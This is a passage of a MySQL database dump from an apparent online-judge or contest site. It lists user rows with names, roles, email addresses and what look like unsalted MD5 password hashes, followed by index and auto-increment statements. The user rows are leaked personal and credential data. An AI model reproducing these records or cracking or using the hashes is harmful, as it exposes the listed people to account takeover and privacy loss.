('RakibulRanak1111111111111', 'bb4aba0633e187d42afb56ac43d605af', 'user', 'abc@abc.com', NULL, 0),
('RakibulRanak2', 'bb4aba0633e187d42afb56ac43d605af', 'Teacher', 'rakibul2@gmail.com', 0x4453435f303635372e4a5047, 0),
('RakibulRanak3', 'bb4aba0633e187d42afb56ac43d605af', 'user', 'rakibulhasanranak3@gmail.com', 0x4453435f303636322e4a5047, 0),
('RakibulRanakdd', 'bb4aba0633e187d42afb56ac43d605af', 'user', 'dipuddbala466@gmail.com', NULL, 0),
('Ranak', '202cb962ac59075b964b07152d234b70', 'user', '123@gmail.com', NULL, 0),
('rrr', 'bb4aba0633e187d42afb56ac43d605af', 'user', 'rrr@gmail.com', 0x4453435f303635392e4a5047, 0),
('rumi', 'e10adc3949ba59abbe56e057f20f883e', 'user', 'rumi@gmail.com', '', 0),
('sex', '453ee02313cb605588c02211bc97e2db', 'user', 'sex@sex.com', NULL, 0),
('sfb', '8f60c8102d29fcd525162d02eed4566b', 'user', 'sssss@gmail.com', NULL, 0),
('shaswata56', '827ccb0eea8a706c4c34a16891f84e7b', 'user', 'shaswata56@gmail.com', '', 0),
('Souhardya Saha', '57b363f2e3ffdc33a578fe750af1aec7', 'user', 'souhardya24@student.sust.edu', '', 0),
('sqx', 'e9ddd2d684405e91c62191324fd4174e', 'user', 'sex@sex.c0m', NULL, 0),
('ss', '47bce5c74f589f4867dbd57e9ca9f808', 'user', 'ss@gmail.com', NULL, 0),
('toph', '83f5c3ad94b1b97af822d643d1e83281', 'user', 'aq@gmail.com', NULL, 0),
('xyz', 'd16fb36f0911f878998c136191af705e', 'Problem Setter', 'xyz@gmail.com', 0x4453435f303636392e4a5047, 0);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `announcement`
--
ALTER TABLE `announcement`
  ADD PRIMARY KEY (`aid`);

--
-- Indexes for table `archieve`
--
ALTER TABLE `archieve`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `code`
--
ALTER TABLE `code`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `codes`
--
ALTER TABLE `codes`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- Indexes for table `contest`
--
ALTER TABLE `contest`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contestproblems`
--
ALTER TABLE `contestproblems`
  ADD PRIMARY KEY (`pbid`);

--
-- Indexes for table `notice`
--
ALTER TABLE `notice`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `submission`
--
ALTER TABLE `submission`
  ADD PRIMARY KEY (`sid`);

--
-- Indexes for table `submissions`
--
ALTER TABLE `submissions`
  ADD PRIMARY KEY (`sid`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`name`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `announcement`
--
ALTER TABLE `announcement`
  MODIFY `aid` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;

--
-- AUTO_INCREMENT for table `archieve`
--
ALTER TABLE `archieve`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=55591;

--
-- AUTO_INCREMENT for table `code`
--
ALTER TABLE `code`
  MODIFY `id` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=635;

--
-- AUTO_INCREMENT for table `codes`
--
ALTER TABLE `codes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=668;

--
-- AUTO_INCREMENT for table `contest`
--
ALTER TABLE `contest`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `contestproblems`
--
ALTER TABLE `contestproblems`
  MODIFY `pbid` int(12) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT for table `notice`
--
ALTER TABLE `notice`
  MODIFY `id` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `submissions`
--
ALTER TABLE `submissions`
  MODIFY `sid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=668;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
